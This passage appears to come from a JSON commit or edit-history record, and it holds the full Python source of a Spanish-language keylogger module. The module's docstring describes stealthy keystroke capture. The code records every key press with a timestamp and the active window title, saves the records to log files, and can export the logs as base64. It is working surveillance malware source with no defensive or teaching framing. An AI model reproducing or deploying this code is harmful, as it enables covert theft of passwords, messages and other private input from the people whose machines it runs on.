 total_keys = len(self.current_log)\r\n+            \r\n+            # Agrupar por ventanas\r\n+            ventanas = {}\r\n+            for log in self.current_log:\r\n+                window = log['window']\r\n+                ventanas[window] = ventanas.get(window, 0) + 1\r\n+            \r\n+            return {\r\n+                \"success\": True,\r\n+                \"stats\": {\r\n+                    \"tiempo_ejecucion\": str(tiempo_total),\r\n+                    \"total_teclas\": total_keys,\r\n+                    \"teclas_por_ventana\": ventanas,\r\n+                    \"archivo_log\": self.log_file\r\n+                }\r\n+            }\r\n+        except Exception as e:\r\n+            return {\"success\": False, \"error\": str(e)}\r\n"
                }
            ],
            "date": 1740261785531,
            "name": "Commit-0",
            "content": "\"\"\"\r\nMódulo de keylogging.\r\nProporciona funcionalidades para capturar y gestionar pulsaciones de teclas\r\nde manera sigilosa y eficiente.\r\n\"\"\"\r\n\r\nimport threading\r\nimport time\r\nimport logging\r\nimport os\r\nfrom datetime import datetime\r\nfrom pynput import keyboard\r\nimport base64\r\nimport json\r\n\r\nclass Keylogger:\r\n    def __init__(self, log_dir=\"keylog\"):\r\n        \"\"\"\r\n        Inicializa el keylogger.\r\n        \r\n        Args:\r\n            log_dir (str): Directorio donde se guardarán los logs\r\n        \"\"\"\r\n        self.log_dir = log_dir\r\n        self.current_log = []\r\n        self.running = False\r\n        self.current_window = None\r\n        self.start_time = None\r\n        self.log_file = None\r\n        self._setup_logging()\r\n        \r\n    def _setup_logging(self):\r\n        \"\"\"Configura el sistema de logging.\"\"\"\r\n        try:\r\n            if not os.path.exists(self.log_dir):\r\n                os.makedirs(self.log_dir)\r\n            self.log_file = os.path.join(\r\n                self.log_dir,\r\n                f\"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt\"\r\n            )\r\n        except Exception as e:\r\n            logging.error(f\"Error configurando keylogger: {e}\")\r\n\r\n    def _on_press(self, key):\r\n        \"\"\"Callback para cuando se presiona una tecla.\"\"\"\r\n        try:\r\n            if not self.running:\r\n                return False\r\n                \r\n            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n            \r\n            try:\r\n                # Teclas normales\r\n                key_char = key.char\r\n            except AttributeError:\r\n                # Teclas especiales\r\n                key_char = str(key)\r\n            \r\n            key_data = {\r\n                \"timestamp\": timestamp,\r\n                \"key\": key_char,\r\n                \"window\": self.current_window,\r\n                \"type\": \"press\"\r\n            }\r\n            \r\n            self.current_log.append(key_data)\r\n            self._write_to_file(key_data)\r\n            \r\n        except Exception as e:\r\n            logging.error(f\"Error en keylogger: {e}\")\r\n\r\n    def _write_to_file(self, key_data):\r\n        \"\"\"Escribe los datos de tecla al archivo.\"\"\"\r\n        try:\r\n            with open(self.log_file, \"a\", encoding=\"utf-8\") as f:\r\n                f.write(json.dumps(key_data) + \"\\n\")\r\n        except Exception as e:\r\n            logging.error(f\"Error escribiendo log: {e}\")\r\n\r\n    def start(self):\r\n        \"\"\"Inicia el keylogger.\"\"\"\r\n        try:\r\n            self.running = True\r\n            self.start_time = datetime.now()\r\n            self.listener = keyboard.Listener(on_press=self._on_press)\r\n            self.listener.start()\r\n            \r\n            # Iniciar thread para actualizar ventana actual\r\n            self.window_thread = threading.Thread(target=self._update_current_window)\r\n            self.window_thread.daemon = True\r\n            self.window_thread.start()\r\n            \r\n            return {\"success\": True}\r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n\r\n    def stop(self):\r\n        \"\"\"Detiene el keylogger.\"\"\"\r\n        try:\r\n            self.running = False\r\n            if hasattr(self, 'listener'):\r\n                self.listener.stop()\r\n            return {\"success\": True}\r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n\r\n    def get_logs(self, format=\"text\"):\r\n        \"\"\"\r\n        Obtiene los logs capturados.\r\n        \r\n        Args:\r\n            format (str): Formato de salida (\"text\", \"json\", \"base64\")\r\n        \r\n        Returns:\r\n            dict: Resultado con los logs en el formato especificado\r\n        \"\"\"\r\n        try:\r\n            if format == \"json\":\r\n                return {\r\n                    \"success\": True,\r\n                    \"data\": self.current_log\r\n                }\r\n            elif format == \"base64\":\r\n                with open(self.log_file, 'rb') as f:\r\n                    return {\r\n                        \"success\": True,\r\n                        \"data\": base64.b64encode(f.read()).decode()\r\n                    }\r\n            else:  # text\r\n                log_text = \"\"\r\n                for entry in self.current_log:\r\n                    log_text += f\"{entry['timestamp']} [{entry['window']}] - {entry['key']}\\n\"\r\n                return {\r\n                    \"success\": True,\r\n                    \"data\": log_text\r\n                }\r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n\r\n    def _update_current_window(self):\r\n        \"\"\"Actualiza el título de la ventana actual.\"\"\"\r\n        try:\r\n            if os.name == 'nt':\r\n                import win32gui\r\n                while self.running:\r\n                    try:\r\n                        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())\r\n                        if window != self.current_window:\r\n                            self.current_window = window\r\n                    except:\r\n                        pass\r\n                    time.sleep(0.1)\r\n            else:\r\n                # Para Linux necesitaríamos usar Xlib\r\n                pass\r\n        except Exception as e:\r\n            logging.error(f\"Error actualizando ventana: {e}\")\r\n\r\n    def clear_logs(self):\r\n        \"\"\"Limpia los logs almacenados.\"\"\"\r\n        try:\r\n            self.current_log = []\r\n            if os.path.exists(self.log_file):\r\n                os.remove(self.log_file)\r\n            self._setup_logging()\r\n            return {\"success\": True}\r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n\r\n    @property\r\n    def is_running(self):\r\n        \"\"\"Indica si el keylogger está activo.\"\"\"\r\n        return self.running\r\n\r\n    def get_stats(self):\r\n        \"\"\"Obtiene estadísticas del keylogger.\"\"\"\r\n        try:\r\n            if not self.start_time:\r\n                return {\"success\": False, \"error\": \"Keylogger no iniciado\"}\r\n                \r\n            tiempo_total = datetime.now() - self.start_time\r\n            total_keys = len(self.current_log)\r\n            \r\n            # Agrupar por ventanas\r\n            ventanas = {}\r\n            for log in self.current_log:\r\n                window = log['window']\r\n                ventanas[window] = ventanas.get(window, 0) + 1\r\n            \r\n            return {\r\n                \"success\": True,\r\n                \"stats\": {\r\n                    \"tiempo_ejecucion\": str(tiempo_total),\r\n                    \"total_teclas\": total_keys,\r\n                    \"teclas_por_ventana\": ventanas,\r\n                    \"archivo_log\": self.log_file\r\n                }\r\n            }\r\n        except Exception as e:\r\n            return {\"success\": False, \"error\": str(e)}\r\n"
        }
    ]
}